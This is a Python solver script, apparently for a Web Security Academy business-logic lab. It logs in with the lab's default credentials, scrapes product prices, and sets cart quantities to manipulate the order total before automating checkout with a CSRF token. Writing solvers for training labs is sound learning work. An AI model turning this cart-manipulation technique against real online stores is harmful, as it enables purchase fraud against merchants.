from web_security_academy.core.utils import print_info, print_success, print_fail
from bs4 import BeautifulSoup
import re


def get_product_info(session, productId):
    resp = session.get_path("/product", params={"productId": productId})
    soup = BeautifulSoup(resp.text, "lxml")
    name = soup.select_one(".product h3").text
    price = soup.select_one(".product #price").text
    return name, price


def solve_lab(session):
    resp = session.login("wiener", "peter")
    soup = BeautifulSoup(resp.text, "lxml")
    regex = re.compile(f"Store credit: (.*)")
    credit = soup.find(text=regex)
    credit = re.match(regex, credit).group(1)
    print_info(f"Credit: {credit}")

    name, price_1 = get_product_info(session, 1)
    print_info(f"Adding {name} x 1 to cart ({price_1})")
    data = {"productId": 1, "quantity": 1, "redir": "PRODUCT"}
    resp = session.post_path("/cart", data=data)

    name, price_2 = get_product_info(session, 2)

    c = float(credit[1:])
    p1 = float(price_1[1:])
    p2 = float(price_2[1:])
    n = int((100 - p1) // p2)

    print_info(f"Adding {name} x {n} to cart (${p2 * n})\n")
    data = {"productId": 2, "quantity": n, "redir": "PRODUCT"}
    resp = session.post_path("/cart", data=data)

    csrf = session.get_csrf_token("/cart", n=2)
    print_info("Proceeding to checkout...")
    resp = session.post_path(
        "/cart/checkout", data={"csrf": csrf}, allow_redirects=False
    )

    if resp.headers["Location"] != "/cart/order-confirmation?order-confirmed=true":
        print_fail("Unable to checkout.")
    else:
        print_success("Success!\n")
        session.get_path(resp.headers["Location"])
